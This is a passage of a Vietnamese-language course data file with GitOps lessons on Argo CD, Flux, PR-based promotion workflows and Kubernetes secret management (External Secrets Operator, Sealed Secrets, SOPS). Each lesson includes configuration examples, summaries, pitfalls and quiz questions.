    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
    retry:
      limit: 3
      backoff:
        duration: 10s
        factor: 2
        maxDuration: 2m`
        }
      },
      {
        h: "App-of-apps và rollback",
        p: [
          "Khi có hàng chục Application, bạn không muốn tạo từng cái bằng tay. Mẫu app-of-apps dùng một Application gốc trỏ tới thư mục chứa các file Application khác; thêm dịch vụ mới chỉ là thêm một file vào Git. ApplicationSet đi xa hơn, sinh Application tự động từ danh sách cluster, thư mục trong repo hoặc pull request.",
          "Rollback trong Argo CD là `git revert` commit gây lỗi. Khi bật auto-sync, lệnh `argocd app rollback` không dùng được, và `kubectl rollout undo` sẽ bị selfHeal hoàn tác. Hãy dùng AppProject để giới hạn mỗi team chỉ deploy được vào namespace và repo của mình, và không để project `default` mở cho mọi thứ trên production."
        ],
        code: {
          lang: "yaml",
          file: "argocd/root.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: root
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/my-org/task-config.git
    targetRevision: main
    path: argocd/apps          # mỗi file trong đây là một Application
  destination:
    server: https://kubernetes.default.svc
    namespace: argocd
  syncPolicy:
    automated: { prune: true, selfHeal: true }`
        }
      }
    ],
    summary: [
      "Application ánh xạ một nguồn trong Git tới một đích trong cluster.",
      "Phân biệt Sync status (khớp Git không) và Health status (chạy tốt không).",
      "`prune` xoá resource thừa, `selfHeal` hoàn tác sửa tay, `retry` thử lại.",
      "App-of-apps và ApplicationSet quản lý nhiều Application; rollback bằng `git revert`."
    ],
    pitfalls: [
      "Bật `prune` mà cấu trúc thư mục sai, Argo CD xoá cả resource đang chạy.",
      "Dùng project `default` không giới hạn cho mọi team trên production.",
      "Dùng `kubectl rollout undo` khi selfHeal bật, Argo CD đưa bản lỗi quay lại."
    ],
    quiz: [
      {
        q: "Ứng dụng hiển thị Synced nhưng Degraded nghĩa là gì?",
        options: ["Cluster chưa khớp Git", "Cluster khớp Git nhưng resource không chạy tốt, ví dụ pod crash", "Argo CD bị lỗi", "Git bị xoá"],
        answer: 1,
        explain: "Sync đo sự khớp với Git; Health đo tình trạng chạy. Hai trạng thái độc lập."
      },
      {
        q: "`selfHeal: true` làm gì?",
        options: ["Tự sửa bug trong code", "Hoàn tác thay đổi tay trên cluster để khớp Git", "Tự restart node", "Tự tạo PR"],
        answer: 1,
        explain: "selfHeal phát hiện drift do sửa tay và đưa cluster về trạng thái trong Git."
      },
      {
        q: "Mẫu app-of-apps giải quyết vấn đề gì?",
        options: ["Build image nhanh hơn", "Quản lý nhiều Application bằng một Application gốc khai báo trong Git", "Mã hoá secret", "Thay thế Helm"],
        answer: 1,
        explain: "Application gốc trỏ tới thư mục chứa các Application khác, thêm dịch vụ chỉ cần thêm file vào Git."
      }
    ]
  },
  "p08.m5.t2": {
    sections: [
      {
        h: "Flux: bộ controller GitOps",
        p: [
          "Flux là dự án GitOps đã tốt nghiệp CNCF, lựa chọn thay thế chính cho Argo CD. Khác biệt lớn nhất là triết lý: Flux là tập hợp controller nhỏ, mỗi cái một việc, cấu hình hoàn toàn bằng Kubernetes custom resource; không có giao diện web tích hợp mặc định như Argo CD. Flux hợp với đội thích mọi thứ là YAML và CLI, và với mô hình nhiều cluster tự quản lý."
        ],
        list: [
          "source-controller: kéo nguồn (GitRepository, HelmRepository, OCIRepository, Bucket).",
          "kustomize-controller: áp dụng manifest qua resource Kustomization, hỗ trợ giải mã SOPS.",
          "helm-controller: cài và nâng cấp Helm chart qua resource HelmRelease.",
          "notification-controller: nhận webhook, gửi thông báo Slack/Teams.",
          "image-reflector và image-automation controller: tự cập nhật tag image trong Git khi có image mới."
        ]
      },
      {
        h: "Bootstrap và Kustomization",
        p: [
          "`flux bootstrap` cài Flux vào cluster, tạo repo (nếu chưa có) và commit chính manifest của Flux vào đó, để Flux tự quản lý chính nó bằng GitOps."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `export GITHUB_TOKEN=<token-có-quyền-repo>
flux bootstrap github \\
  --owner=my-org \\
  --repository=fleet-config \\
  --branch=main \\
  --path=clusters/production

flux get kustomizations
flux reconcile kustomization apps --with-source`
        }
      },
      {
        h: "Kustomization và HelmRelease",
        p: [
          "Lưu ý: Kustomization của Flux (`kustomize.toolkit.fluxcd.io`) là resource trong cluster, khác với file `kustomization.yaml` của công cụ kustomize. Kustomization của Flux trỏ tới một đường dẫn, và trong đường dẫn đó có thể có file `kustomization.yaml` bình thường. `prune: true` có ý nghĩa như prune của Argo CD. HelmRelease có cơ chế remediation: nâng cấp lỗi thì tự rollback về release trước."
        ],
        code: {
          lang: "yaml",
          file: "clusters/production/apps.yaml",
          src: `apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: apps
  namespace: flux-system
spec:
  interval: 10m
  path: ./apps/production
  prune: true
  wait: true
  timeout: 5m
  sourceRef:
    kind: GitRepository
    name: flux-system
---
apiVersion: source.toolkit.fluxcd.io/v1
kind: HelmRepository
metadata:
  name: my-charts
  namespace: flux-system
spec:
  interval: 1h
  url: https://charts.example.com
---
apiVersion: helm.toolkit.fluxcd.io/v2
kind: HelmRelease
metadata:
  name: task-api
  namespace: production
spec:
  interval: 10m
  chart:
    spec:
      chart: task-api
      version: "1.4.x"
      sourceRef:
        kind: HelmRepository
        name: my-charts
        namespace: flux-system
  values:
    replicaCount: 3
    image:
      tag: a1b2c3d
  upgrade:
    remediation:
      retries: 2`
        }
      },
      {
        h: "Argo CD hay Flux",
        p: [
          "Cả hai đều trưởng thành và giải quyết cùng bài toán. Chọn Argo CD nếu đội cần giao diện trực quan, SSO và phân quyền theo project cho nhiều team, hoặc muốn quản lý nhiều cluster từ một chỗ. Chọn Flux nếu thích mọi thứ khai báo bằng CRD, cần giải mã SOPS có sẵn, hoặc muốn mỗi cluster tự quản lý độc lập. Quan trọng hơn công cụ là cấu trúc repo config và quy trình promotion, phần của bài tiếp theo."
        ]
      }
    ],
    summary: [
      "Flux là tập controller GitOps cấu hình hoàn toàn bằng CRD.",
      "GitRepository/HelmRepository là nguồn; Kustomization và HelmRelease là cách áp dụng.",
      "`flux bootstrap` để Flux tự quản lý chính nó từ Git.",
      "Kustomization của Flux khác file kustomization.yaml của kustomize."
    ],
    pitfalls: [
      "Nhầm Kustomization của Flux với file `kustomization.yaml`, đặt sai apiVersion.",
      "Đặt `version: \"*\"` cho HelmRelease, chart major mới tự lên production.",
      "Dùng token cá nhân quyền rộng cho bootstrap rồi để nguyên lâu dài."
    ],
    quiz: [
      {
        q: "Resource nào của Flux dùng để cài Helm chart?",
        options: ["Application", "HelmRelease", "Rollout", "ExternalSecret"],
        answer: 1,
        explain: "HelmRelease do helm-controller xử lý. Application là của Argo CD, Rollout của Argo Rollouts."
      },
      {
        q: "`flux bootstrap` làm gì?",
        options: ["Build image", "Cài Flux vào cluster và commit manifest của Flux vào repo để Flux tự quản lý chính nó", "Xoá cluster", "Tạo SBOM"],
        answer: 1,
        explain: "Bootstrap cài controller và đưa cấu hình Flux vào Git, từ đó mọi thay đổi Flux cũng qua GitOps."
      },
      {
        q: "Khác biệt triết lý nổi bật giữa Flux và Argo CD?",
        options: ["Flux không hỗ trợ Helm", "Flux là tập controller cấu hình bằng CRD, không có web UI tích hợp mặc định", "Argo CD không hỗ trợ Git", "Flux chỉ chạy ngoài cluster"],
        answer: 1,
        explain: "Flux hướng tới CRD và CLI; Argo CD nổi bật với giao diện web. Cả hai đều hỗ trợ Helm và chạy trong cluster."
      }
    ]
  },
  "p08.m5.t3": {
    sections: [
      {
        h: "Tách repo app và repo config",
        p: [
          "Repo app chứa mã nguồn và Dockerfile; repo config chứa manifest (Helm values, Kustomize overlay) cho từng môi trường. Tách hai repo mang lại nhiều lợi ích: lịch sử deploy sạch, không lẫn với commit code; quyền khác nhau (developer merge code, nhưng chỉ một nhóm duyệt thay đổi production); commit CI cập nhật tag không kích hoạt lại CI build vô hạn; một repo config có thể chứa nhiều dịch vụ.",
          "Đội nhỏ có thể để config trong thư mục `deploy/` của repo app, miễn là cấu hình đường dẫn trigger để tránh vòng lặp. Khi số dịch vụ và môi trường tăng, tách repo thường đáng công hơn."
        ],
        code: {
          lang: "text",
          file: "task-config/",
          src: `apps/task-api/
  base/                    # Deployment, Service chung
    kustomization.yaml
    deployment.yaml
  overlays/
    staging/
      kustomization.yaml   # images: newTag = a1b2c3d, replicas 2
    production/
      kustomization.yaml   # images: newTag = 9f8e7d6, replicas 6
argocd/apps/
  task-api-staging.yaml
  task-api-production.yaml`
        }
      },
      {
        h: "CI cập nhật tag và promotion bằng PR",
        p: [
          "Sau khi build image, CI commit thẳng tag mới vào overlay staging, Argo CD tự deploy. Với production, CI mở một PR đổi tag; người duyệt merge PR đó là hành động promotion. Tag được đưa lên production phải là tag đã chạy trên staging, đúng tinh thần build once, deploy many."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/promote.yml",
          src: `name: Promote
on:
  workflow_call:
    inputs:
      image_tag: { type: string, required: true }

permissions:
  contents: read

jobs:
  bump-staging:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          repository: my-org/task-config
          token: \${{ secrets.CONFIG_REPO_TOKEN }}
      - name: Cập nhật tag staging
        env:
          TAG: \${{ inputs.image_tag }}
        run: |
          cd apps/task-api/overlays/staging
          kustomize edit set image ghcr.io/my-org/task-api=ghcr.io/my-org/task-api:$TAG
          git config user.name "ci-bot"
          git config user.email "ci-bot@users.noreply.github.com"
          git commit -am "chore(staging): task-api $TAG"
          git push

  pr-production:
    needs: bump-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          repository: my-org/task-config
          token: \${{ secrets.CONFIG_REPO_TOKEN }}
      - name: Mở PR promotion
        env:
          TAG: \${{ inputs.image_tag }}
          GH_TOKEN: \${{ secrets.CONFIG_REPO_TOKEN }}
        run: |
          git switch -c "promote/task-api-$TAG"
          cd apps/task-api/overlays/production
          kustomize edit set image ghcr.io/my-org/task-api=ghcr.io/my-org/task-api:$TAG
          git config user.name "ci-bot"
          git config user.email "ci-bot@users.noreply.github.com"
          git commit -am "chore(production): task-api $TAG"
          git push -u origin HEAD
          gh pr create --title "Promote task-api $TAG lên production" \\
            --body "Tag này đã chạy trên staging." --base main`
        }
      },
      {
        h: "Token và công cụ hỗ trợ",
        p: [
          "`GITHUB_TOKEN` của repo app không ghi được vào repo khác, nên cần một credential riêng. Tốt nhất là GitHub App cài chỉ trên repo config, sinh token ngắn hạn mỗi lần chạy; hoặc fine-grained PAT giới hạn đúng một repo. Tránh PAT classic quyền `repo` trên toàn tổ chức.",
          "Nếu không muốn tự viết bước bump, có công cụ chuyên dụng: Argo CD Image Updater, Flux image automation tự cập nhật tag khi registry có image mới theo chính sách, và Kargo quản lý promotion qua nhiều giai đoạn. Dù dùng gì, CODEOWNERS và branch protection trên repo config vẫn là cổng duyệt production."
        ]
      },
      {
        h: "Luồng promotion đầy đủ",
        p: [
          "Ghép mọi phần trong chương lại, một thay đổi đi từ laptop tới production như sau. Mỗi bước đều có dấu vết trong Git hoặc trong lịch sử pipeline, nên khi có sự cố bạn truy ngược được chính xác ai đã đổi gì."
        ],
        list: [
          "PR vào repo app: lint, test, SAST, SCA, secret scan; review và merge.",
          "CI trên main: build image một lần, scan, ký, push theo SHA.",
          "CI commit tag mới vào overlay staging; Argo CD đồng bộ; smoke test và DAST chạy trên staging.",
          "CI mở PR promotion cho production; người duyệt merge; Argo CD đồng bộ, canary hoặc rolling update.",
          "Có sự cố: `git revert` commit promotion, hoặc tắt feature flag."
        ]
      }
    ],
    summary: [
      "Repo app chứa code; repo config chứa manifest cho từng môi trường.",
      "CI commit tag mới vào staging; production được promote qua PR có người duyệt.",
      "Chỉ promote tag đã chạy trên staging.",
      "Dùng GitHub App hoặc fine-grained token chỉ cho repo config."
    ],
    pitfalls: [
      "Dùng PAT classic quyền ghi toàn tổ chức cho bước bump tag.",
      "Build lại image khi promote production thay vì dùng tag đã chạy staging.",
      "Để config trong repo app mà không lọc trigger, commit bump tag kích hoạt CI build lại liên tục."
    ],
    quiz: [
      {
        q: "Trong mô hình GitOps với repo config, promotion lên production thường là hành động gì?",
        options: ["Chạy kubectl apply", "Merge PR đổi tag image trong overlay production", "Build lại image", "Restart cluster"],
        answer: 1,
        explain: "PR vào repo config là cổng duyệt; merge xong agent GitOps tự đồng bộ."
      },
      {
        q: "Vì sao `GITHUB_TOKEN` của repo app không dùng được để push vào repo config?",
        options: ["Vì nó hết hạn ngay", "Vì nó chỉ có phạm vi trên repo đang chạy workflow", "Vì Git không hỗ trợ token", "Vì repo config là public"],
        answer: 1,
        explain: "GITHUB_TOKEN chỉ có quyền trên repo chứa workflow; ghi repo khác cần GitHub App hoặc token riêng."
      },
      {
        q: "Lợi ích của việc tách repo config khỏi repo app?",
        options: ["Không cần review", "Lịch sử deploy rõ ràng, phân quyền riêng, tránh vòng lặp CI", "Build nhanh hơn", "Không cần Kubernetes"],
        answer: 1,
        explain: "Tách repo giúp audit deploy, phân quyền duyệt production và tránh commit bump tag kích hoạt CI."
      }
    ]
  },
  "p08.m5.t4": {
    sections: [
      {
        h: "Bài toán: Git là nguồn sự thật, nhưng secret không được vào Git",
        p: [
          "Kubernetes Secret chỉ mã hoá base64, không phải mã hoá thật. Commit Secret YAML vào Git nghĩa là ai đọc được repo, hoặc bất kỳ bản clone, fork nào, đều có mật khẩu. Có hai hướng giải quyết: lưu secret đã được mã hoá trong Git, hoặc chỉ lưu tham chiếu tới secret nằm ở secret manager bên ngoài."
        ],
        list: [
          "Sealed Secrets: mã hoá bằng khoá công khai của controller trong cluster; chỉ controller giải mã được. Đơn giản, không cần hạ tầng ngoài.",
          "SOPS: mã hoá giá trị trong file YAML/JSON bằng age, PGP hoặc KMS của cloud; key vẫn đọc được nên diff dễ xem. Flux giải mã sẵn; Argo CD cần plugin.",
          "External Secrets Operator (ESO): Git chỉ chứa tham chiếu; operator đọc từ AWS Secrets Manager, Vault, GCP Secret Manager... rồi tạo Secret trong cluster, có thể tự làm mới."
        ]
      },
      {
        h: "External Secrets Operator với AWS Secrets Manager",
        p: [
          "ESO thường là lựa chọn tốt nhất khi đã dùng cloud: secret nằm một nơi, xoay vòng tập trung, phân quyền bằng IAM. ClusterSecretStore mô tả cách kết nối; ExternalSecret mô tả lấy key nào, tạo Secret tên gì. Operator xác thực tới AWS bằng service account gắn IAM role, không có access key."
        ],
        code: {
          lang: "yaml",
          file: "apps/task-api/overlays/production/external-secret.yaml",
          src: `apiVersion: external-secrets.io/v1
kind: ClusterSecretStore
metadata:
  name: aws-secrets-manager
spec:
  provider:
    aws:
      service: SecretsManager
      region: ap-southeast-1
      auth:
        jwt:
          serviceAccountRef:
            name: external-secrets
            namespace: external-secrets
---
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: task-api-db
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    kind: ClusterSecretStore
    name: aws-secrets-manager
  target:
    name: task-api-db          # Secret Kubernetes được tạo ra
  data:
    - secretKey: DATABASE_URL
      remoteRef:
        key: prod/task-api/database-url`
        }
      },
      {
        h: "Sealed Secrets và SOPS",
        p: [
          "Với Sealed Secrets, bạn tạo Secret cục bộ ở chế độ dry-run rồi mã hoá bằng `kubeseal`; chỉ file đã mã hoá được commit. Với SOPS, file `.sops.yaml` quy định mã hoá trường nào bằng khoá nào, thường chỉ mã hoá `data` và `stringData`."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Sealed Secrets: tạo SealedSecret từ Secret dry-run
kubectl create secret generic task-api-db -n production \\
  --from-literal=DATABASE_URL='postgres://app:***@db:5432/app' \\
  --dry-run=client -o yaml \\
  | kubeseal --format yaml > sealed-task-api-db.yaml

# SOPS với age: chỉ mã hoá các trường data/stringData
cat > .sops.yaml <<'EOF'
creation_rules:
  - path_regex: secrets/production/.*\\.yaml$
    encrypted_regex: ^(data|stringData)$
    age: age1examplepublickeyreplacewithyourown
EOF
sops --encrypt --in-place secrets/production/task-api-db.yaml`
        }
      },
      {
        h: "So sánh nhanh",
        p: [
          "Sealed Secrets đơn giản nhất nhưng gắn với khoá của một cluster; mất khoá thì phải mã hoá lại mọi thứ, nên phải backup khoá controller. SOPS linh hoạt, dùng được ngoài Kubernetes, nhưng cần quản lý khoá giải mã cho agent GitOps. ESO không đưa secret vào Git chút nào và hỗ trợ xoay vòng tập trung, đổi lại phụ thuộc vào secret manager bên ngoài. Dù chọn cách nào, Secret sau khi được tạo trong cluster vẫn cần RBAC chặt và bật mã hoá etcd."
        ]
      }
    ],
    summary: [
      "Kubernetes Secret chỉ là base64, không được commit dạng plain.",
      "Sealed Secrets và SOPS lưu secret đã mã hoá trong Git.",
      "External Secrets Operator chỉ lưu tham chiếu, đọc secret từ secret manager.",
      "Backup khoá giải mã, dùng RBAC chặt và mã hoá etcd."
    ],
    pitfalls: [
      "Commit Secret YAML với giá trị base64 vì tưởng đó là mã hoá.",
      "Không backup khoá của Sealed Secrets controller, dựng lại cluster thì không giải mã được gì.",
      "Để file Secret tạm (chưa mã hoá) trong thư mục repo rồi vô tình commit."
    ],
    quiz: [
      {
        q: "Vì sao không được commit Kubernetes Secret YAML thông thường vào Git?",
        options: ["Vì YAML không hợp lệ", "Vì base64 chỉ là mã hoá ký tự, ai cũng giải được", "Vì Git không lưu được file lớn", "Vì Argo CD không đọc được"],
        answer: 1,
        explain: "Base64 là encoding, không phải encryption; ai có repo đều đọc được giá trị."
      },
      {
        q: "External Secrets Operator lưu gì trong Git?",
        options: ["Giá trị secret đã mã hoá", "Chỉ tham chiếu tới secret trong secret manager bên ngoài", "Giá trị secret dạng plain", "Khoá riêng của cluster"],
        answer: 1,
        explain: "ExternalSecret chỉ mô tả lấy key nào từ đâu; giá trị nằm ở secret manager."
      },
      {
        q: "Rủi ro vận hành lớn nhất của Sealed Secrets là gì?",
        options: ["Không hỗ trợ Kubernetes", "Mất khoá riêng của controller thì không giải mã được các SealedSecret", "Không mã hoá được", "Chạy quá chậm"],
        answer: 1,
        explain: "Chỉ khoá của controller giải mã được; cần backup khoá để khôi phục khi dựng lại cluster."
      }
    ]
  },
});
